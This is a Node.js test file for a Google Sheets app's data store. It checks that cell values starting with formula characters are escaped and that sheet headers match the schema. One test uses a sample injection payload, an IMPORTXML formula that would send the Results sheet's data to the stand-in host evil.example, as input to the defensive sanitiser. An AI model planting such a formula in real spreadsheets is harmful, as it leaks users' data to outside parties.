'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadPureFunctions } = require('../dev/app-context');

// Store.js does reach for SpreadsheetApp, but only inside function bodies that
// this file never calls, so evaluating it here is safe.
const { sanitizeRows_, verifyHeader_, verifiedHeaders_, SCHEMA } =
  loadPureFunctions(['Schema.js', 'Store.js'],
    ['sanitizeRows_', 'verifyHeader_', 'verifiedHeaders_', 'SCHEMA']);

/** A sheet stub exposing only the one call verifyHeader_ makes. */
const sheetWithHeader = (header) => ({
  getRange: (_row, _col, _rows, columns) => ({
    getValues: () => [header.slice(0, columns)]
  })
});

/** verifyHeader_ caches its verdict, so each case needs a table nobody else used. */
let tableSeq = 0;
const freshTable = (columns) => {
  const name = 'T' + ++tableSeq;
  SCHEMA[name] = columns;
  return name;
};

test('a note that looks like a formula is written as text', () => {
  const attack = '=IMPORTXML("https://evil.example?d="&JOIN(",",Results!A:O"),"//a")';
  assert.deepEqual(sanitizeRows_([[attack]]), [["'" + attack]]);
});

test('every character Sheets treats as a formula start is escaped', () => {
  const rows = [['=a'], ['+a'], ['-a'], ['@a'], ['\ta'], ['\ra']];
  assert.deepEqual(
    sanitizeRows_(rows).map((row) => row[0][0]),
    ["'", "'", "'", "'", "'", "'"]
  );
});

test('ordinary values are handed through untouched', () => {
  const rows = [['自宅', 'メモ', '', 'G20260825-01'], [25000, -12.5, true, null]];
  assert.deepEqual(sanitizeRows_(rows), rows);
});

test('escaping survives the read-modify-write cycle', () => {
  // storeUpdateRowsByKey writes back rows it only read. Sheets drops the
  // apostrophe on read, so the value coming back in is the bare '=a' again and
  // has to be escaped a second time — never doubled up on an already-safe value.
  const once = sanitizeRows_([['=a', 'safe']]);
  assert.deepEqual(once, [["'=a", 'safe']]);
  assert.deepEqual(sanitizeRows_([['=a', 'safe']]), once);
});

test('a value the user really did start with an apostrophe is left alone', () => {
  assert.deepEqual(sanitizeRows_([["'quoted"]]), [["'quoted"]]);
});

test('a header matching the schema is accepted, and rechecked only once', () => {
  const table = freshTable(['a', 'b', 'c']);
  let reads = 0;
  const sheet = {
    getRange: (...args) => {
      reads++;
      return sheetWithHeader(['a', 'b', 'c']).getRange(...args);
    }
  };
  verifyHeader_(table, sheet);
  verifyHeader_(table, sheet);
  assert.equal(reads, 1);
  assert.equal(verifiedHeaders_[table], true);
});

test('a removed column is caught instead of shifting every field one slot over', () => {
  // Exactly the Results sheet after 'chips' was dropped from the app but not
  // from the spreadsheet: 'tobi' would be read out of the chips column.
  const table = freshTable(['totalPt', 'tobi', 'deleted']);
  assert.throws(
    () => verifyHeader_(table, sheetWithHeader(['totalPt', 'chips', 'tobi'])),
    /2列目は「tobi」であるべきですが「chips」でした/
  );
  assert.equal(verifiedHeaders_[table], undefined);
});

test('a blank header row asks for the header rather than naming a column', () => {
  const table = freshTable(['a', 'b']);
  assert.throws(() => verifyHeader_(table, sheetWithHeader(['', '   '])),
    /見出し行がありません/);
});

test('header cells are compared trimmed, and extra columns to the right are ignored', () => {
  const table = freshTable(['a', 'b']);
  verifyHeader_(table, sheetWithHeader([' a ', 'b', 'legacy']));
  assert.equal(verifiedHeaders_[table], true);
});

test('every real table accepts the header the app itself writes', () => {
  Object.keys(SCHEMA).forEach((tableName) => {
    delete verifiedHeaders_[tableName];
    verifyHeader_(tableName, sheetWithHeader(SCHEMA[tableName]));
  });
});
